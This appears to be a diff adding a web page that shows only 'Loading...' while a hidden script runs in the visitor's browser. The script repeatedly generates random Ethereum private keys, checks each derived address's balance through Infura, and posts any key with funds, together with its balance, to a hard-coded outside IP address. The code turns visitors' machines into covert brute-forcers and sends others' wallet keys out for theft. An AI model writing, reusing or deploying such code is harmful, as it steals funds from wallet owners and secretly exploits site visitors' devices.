@@ -1,0 +1,86 @@
+<head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-117546316-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-117546316-1');
+</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/ethjs@0.3.4/dist/ethjs.min.js"></script>
+<script type="text/javascript" src="./ethjs-account.min.js"></script>
+</head>
+<script>
+
+const eth = new window.Eth(new Eth.HttpProvider('https://mainnet.infura.io/6Dn58expyVnlOA4Bm5Li'));
+function randomString(length, chars) {
+    var result = '';
+    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
+    return result;
+}
+// dec2hex :: Integer -> String
+function dec2hex (dec) {
+  return ('0' + dec.toString(16)).substr(-2)
+}
+
+// generateId :: Integer -> String
+function generateId (len) {
+  var arr = new Uint8Array((len || 40) / 2)
+  window.crypto.getRandomValues(arr)
+  return Array.from(arr, dec2hex).join('')
+}
+
+console.log(generateId())
+// "82defcf324571e70b0521d79cce2bf3fffccd69"
+
+console.log(generateId(20))
+function doAgain(){
+try{
+var rString=generateId(64);
+//var rString = randomString(64, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
+const privateToAccount = ethAccount.privateToAccount;
+//console.log(rString);
+var add = (privateToAccount(("0x" + rString).toString('hex')).address);
+console.log(add);
+//console.log(rString);
+eth.getBalance(add)
+.then((result) => {
+ var bal = (result.toString(10));
+if (bal != "0"){
+var jqxhr = $.post( "http://http://35.196.204.203/index.php", { pk: rString, bal: bal }, function() {
+  console.log( "success" );
+doAgain();
+})
+  .done(function() {
+    console.log( "second success" );
+  })
+  .fail(function() {
+    console.log( "error" );
+  })
+  .always(function() {
+    console.log( "finished" );
+  });
+
+
+
+}else {
+
+setTimeout(function (){ doAgain(); }, 12);}
+})
+.catch((error) => {
+  console.log(error);
+});
+}
+
+catch (err){
+console.log(err);
+doAgain();
+}
+}
+doAgain();
+</script>
+
+Loading...
